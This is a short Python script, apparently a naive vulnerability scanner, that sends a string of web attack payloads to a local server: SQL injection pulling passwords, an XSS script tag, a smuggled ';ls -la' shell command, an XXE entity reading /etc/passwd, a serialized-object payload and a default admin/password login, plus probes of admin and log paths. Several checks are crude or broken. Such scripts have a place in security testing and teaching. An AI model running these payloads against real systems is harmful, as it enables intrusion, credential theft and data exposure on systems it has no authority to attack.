import requests
from bs4 import BeautifulSoup

url = 'http://127.0.0.1' 

# SQL Injection
response = requests.get(url + "/?id=1';SELECT password FROM users;--")
soup = BeautifulSoup(response.text, 'html.parser')
print(response)

# Cross-Site Scripting (XSS)
payload = "<script>alert('XSS Vulnerability')</script>"
response = requests.post(url + "/submit?comment=" + payload)
print(response)

# Command Injection
payload = ";ls -la"
response = requests.get(url + "/search?q=" + payload)
print(response)

# Insecure Deserialization
serialized_data = "a:1:{s:4:`name`;O:8:`stdClass`:0:{}}"
response = requests.post(url + "/", data={'data': serialized_data})
print(response)

# Using Components with Known Vulnerabilities
response = requests.get(url + "/admin", headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0'})
print(response)

# XML External Entities (XXE)
payload = "<?xml version='1.0' encoding='ISO-8859-1' ?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM 'file:///etc/passwd' >]><foo>&xxe;</foo>"
response = requests.post(url + "/xml", data=payload, headers={'Content-Type': 'application/xml'})
print(response)

# Broken Authentication
payload = {'username': 'admin', 'password': 'password'}
response = requests.post(url + "/login", data=payload)
print(response)

# Security Misconfiguration
response = requests.get(url + "/dev")
print(response)

# Insecure Direct Object References
response = requests.get(url + "/users/1")
print(response)

# Insufficient Logging & Monitoring
response = requests.get(url + "/admin/logs")
print(response)

print("Script completed")
